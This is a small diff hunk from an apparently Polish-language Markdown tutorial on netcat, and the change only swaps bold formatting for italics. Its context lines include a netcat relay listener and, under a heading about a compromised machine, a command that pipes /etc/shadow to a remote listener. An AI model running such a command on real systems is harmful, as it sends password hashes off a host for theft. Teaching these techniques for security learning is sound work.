@@ -304,7 +304,7 @@ nc -nlktp 8001 -c "nc 127.0.0.1 8000"
 ```
 {: .text-justify}
 ### Przejęta maszyna 
-Jak już wcześniej wspomniałem przełącznik **-N** działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu **nmap** - trzeba po wysłaniu pliku, wcisnąć **ctrl+c** aby zakończyć.
+Jak już wcześniej wspomniałem przełącznik _-N_ działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu _nmap_ - trzeba po wysłaniu pliku, wcisnąć _ctrl+c_ aby zakończyć.
 {: .text-justify}
 ```bash
 cat /etc/shadow | nc -vN 172.16.1.89 1337 
